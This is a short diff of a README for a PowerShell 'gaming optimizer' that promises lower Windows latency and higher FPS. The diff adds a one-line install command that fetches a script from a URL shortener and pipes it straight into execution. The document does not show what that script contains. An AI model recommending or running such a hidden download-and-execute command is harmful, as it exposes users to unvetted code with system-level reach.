@@ -1,7 +1,8 @@
 # Xelero-Gaming-Opimizer
 My gaming optimizer
 ⚡ XELERO // BLACK EDITION (v39.0)
-"For the sake of the frames."
+
+irm is.gd/Xelero_optimizer | iex 
 
 XELERO is a lightweight, high-performance PowerShell utility designed to strip away Windows latency and maximize FPS in competitive titles like CS2, Valorant, BO6, and Apex Legends. >
 Built for the community, XELERO focuses on kernel-level responsiveness, input lag reduction, and hardware-specific optimizations (Intel Laptop/Desktop) without the corporate bloat.
